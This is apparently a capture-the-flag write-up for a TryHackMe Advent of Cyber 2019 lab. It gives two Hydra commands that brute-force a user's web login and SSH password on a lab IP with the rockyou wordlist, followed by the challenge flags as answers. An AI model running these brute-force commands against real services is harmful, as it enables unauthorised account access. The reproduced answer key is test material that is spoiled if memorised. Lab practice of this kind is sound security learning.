# Advent of Cyber 01 - 2019
# Day 17
# Hydra ha ha haa

> Machine IP : `10.10.76.60`

> bruteforcing http login: 
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.60 http-post-form '/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.'
```
> bruteforcing ssh password :
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.60 ssh -t 5

```

| Que$t1on$ | An$wer$ |
|-----------|---------|
| Use Hydra to bruteforce molly's password. What is flag1 ? | THM{2673a7dd116de68e85c48ec0b1f2612e} |
| Use Hydra to bruteforce molly's SSH. What is flag2 ? | THM{c8eeb0468febbadea859baeb33b2541b} |
